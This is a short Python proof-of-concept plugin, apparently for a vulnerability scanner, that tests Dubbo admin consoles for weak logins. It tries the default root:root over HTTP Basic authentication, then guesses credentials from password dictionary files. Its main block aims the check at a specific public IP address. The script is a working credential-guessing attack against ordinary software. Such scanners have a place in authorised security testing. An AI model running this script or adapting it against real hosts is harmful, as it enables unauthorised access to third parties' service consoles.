#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  :  dubbo Weak Pass
Author    :  a
mail      :  a@lcx.cc

DUBBO是一个分布式服务框架，
致力于提供高性能和透明化的RPC远程服务调用方案，
是阿里巴巴SOA服务化治理方案的核心框架，
每天为2,000+个服务提供3,000,000,000+次访问量支持，
并被广泛应用于阿里巴巴集团的各成员站点。

存在弱口令 root:root
"""


import urlparse
import time
import base64 

def assign(service, arg):
    if service == 'dubbo':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    defaultpass = ['root','root']
    sdkpass = loadSDKWeakPassWd(arg)
    res ,code = weakPass(arg,defaultpass)
    if code ==0:
        return
    if 'dubbo.js' in res and code == 200:
        security_hole(arg +'     user:%s pass:%s' % (defaultpass[0],defaultpass[1]))
    else:
        security_note('using SDK to creak ....')
        for l in sdkpass:
            res ,code = weakPass(arg,l)
            if 'dubbo.js' in res and code == 200:
                security_hole(arg +'     user:%s pass:%s' % (l[0],l[1])) 
                                
    
def weakPass(arg,list):
    namepass = list[0] +':' + list[1]
    header = 'Authorization: Basic %s' % base64.encodestring(namepass)

    code, head,res, errcode, _ = curl.curl2(arg,header = header) 
    return res ,code
    
def loadSDKWeakPassWd(args):
    r = urlparse.urlparse(args)
    host = r.hostname
    sdklist = []
 
    pass_list = util.load_password_dict(
        host,
        userfile='database/http_user.txt', 
        passfile='database/http_pass.txt',
        userlist=None,
        passlist=None,
        mix=True,
        )
    sdklist = pass_list
    return sdklist
       

if __name__ == '__main__':
    from dummy import *
    audit(assign('dubbo', 'http://112.74.39.139:8080/')[1])
